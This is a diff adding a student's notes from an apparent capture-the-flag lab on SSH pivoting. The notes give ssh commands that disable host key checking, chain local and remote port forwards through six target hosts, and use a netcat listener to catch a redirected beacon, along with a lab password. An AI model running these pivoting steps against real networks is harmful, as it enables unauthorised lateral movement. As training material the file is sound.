@@ -1,0 +1,68 @@
+>T1: 10.50.28.223	
+		
+	>T2: 192.168.0.13	
+		
+		<T3: 192.168.0.9
+		
+	>T4: 192.168.0.27	
+		
+		>T5: 192.168.0.23
+		
+		>T6: 192.168.0.10
+		
+#triple click, middle click to copy and paste
+#connect to T1
+ssh -M -S /tmp/T1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.28.223
+password4
+
+#tunnel to kali -> T1 -> T2
+ssh -S /tmp/T1 bad -O forward -L 2222:192.168.0.13:22
+
+#connect to T2 using tunnel 1
+ssh -M -S /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+
+T3:
+Action: Perform SSH masquerade. Use tunnels to redirect the beacon from T3 on port 123## to capture on your opstation on the same port. You will need to establish a netcat listener on your opstation with the following command: nc -nvlp 123## Redirect to the next target.
+
+#set up remote tunnel to receive beacon from T3
+ssh -S /tmp/T2 bad -O forward -R 192.168.0.13:12304:localhost:12304
+
+#set up listener
+nc -nlvp 12304
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33908
+Congrats! You are an 31337 H4x0r! Credentials student#::password#
+
+#cancel out T2 and T3
+ssh -S /tmp/T2 bad -O cancel -R 192.168.0.13:12304:localhost:12304
+ssh -S /tmp/T1 bad -O cancel -L 2222:192.168.0.13:22
+exit from T2 (keep T1)
+
+#tunnel to kali -> T1 -> T4 (wadewilson)
+ssh -S /tmp/T1 bad -O forward -L 3333:192.168.0.27:22
+
+#connect to T4 using tunnel 2
+ssh -M -S /tmp/T4 -p 3333 student4@localhost
+
+#create tunnel to T4 ->T5
+ssh -S /tmp/T4 bad -O forward -L 4444:192.168.0.23:22
+
+#connect to T5 (peterparker)
+ssh -MS /tmp/T5 -p 4444 student4@localhost
+
+#create tunnel to T4 -> T6
+ssh -S /tmp/T4 bad -O forward -L 5555:192.168.0.10:22
+
+#connect to T6 (tonystark)
+ssh -MS /tmp/T6 -p 5555 student4@localhost
+ssh -M -S /tmp/T6 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+
+#clean up
+exit from T6
+exit from T5
+exit from T4
+exit from T1
+
+
+
+
+
